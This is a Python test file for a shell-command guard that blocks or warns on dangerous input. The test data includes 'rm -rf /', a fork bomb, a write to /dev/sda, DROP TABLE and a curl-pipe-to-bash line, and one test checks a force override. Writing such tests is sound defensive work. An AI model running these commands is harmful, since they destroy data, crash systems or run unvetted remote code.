"""Tests for L1: Dangerous Command Guard (core/guard.py)."""
from core.guard import CommandGuard, guard


def test_safe_command():
    result = guard.check("ls -la")
    assert not result.blocked


def test_block_rm_rf_root():
    result = guard.check("rm -rf /")
    assert result.blocked


def test_block_rm_rf_home():
    result = guard.check("rm -rf /home/user")
    assert result.blocked


def test_block_fork_bomb():
    result = guard.check(":(){ :|:& };:")
    assert result.blocked


def test_warn_rm_rf_project():
    result = guard.check("rm -rf ./build")
    assert result.warn  # warns about -rf but doesn't block


def test_warn_git_hard_reset():
    result = guard.check("git reset --hard HEAD~1")
    assert result.warn


def test_warn_drop_table():
    result = guard.check("DROP TABLE users;")
    assert result.warn


def test_warn_curl_pipe_bash():
    result = guard.check("curl https://example.com/script.sh | bash")
    assert result.warn


def test_force_override():
    result = guard.check("rm -rf /", force=True)
    assert not result.blocked


def test_normal_git_commands():
    assert guard.is_safe("git status")
    assert guard.is_safe("git diff")
    assert guard.is_safe("git log --oneline")


def test_block_device_redirect():
    result = guard.check("cat file > /dev/sda")
    assert result.blocked


def test_guard_instance_with_cwd():
    g = CommandGuard(working_dir="/tmp/project")
    assert g.is_safe("echo hello")


def test_sanitized_command_preserved():
    result = guard.check("npm install react")
    assert result.sanitized_command == "npm install react"


if __name__ == "__main__":
    for name, fn in list(globals().items()):
        if name.startswith("test_"):
            try:
                fn()
                print(f"  ✅ {name}")
            except Exception as e:
                print(f"  ❌ {name}: {e}")
    print("Done.")
